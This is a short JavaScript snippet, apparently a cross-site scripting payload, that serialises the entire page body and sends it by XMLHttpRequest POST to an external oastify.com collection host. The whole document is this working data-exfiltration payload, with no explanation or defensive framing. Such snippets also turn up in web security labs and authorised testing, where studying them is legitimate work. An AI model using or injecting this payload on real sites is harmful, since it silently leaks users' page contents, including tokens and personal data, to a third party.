data = JSON.stringify(document.body.innerHTML);
  console.log(data);
  url = "https://bcr0sqqkq1kugx6gqelgxmczzq5gt5.oastify.com";
  xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-type", "application/json;charset=UTF-8");
  xhr.send(data);
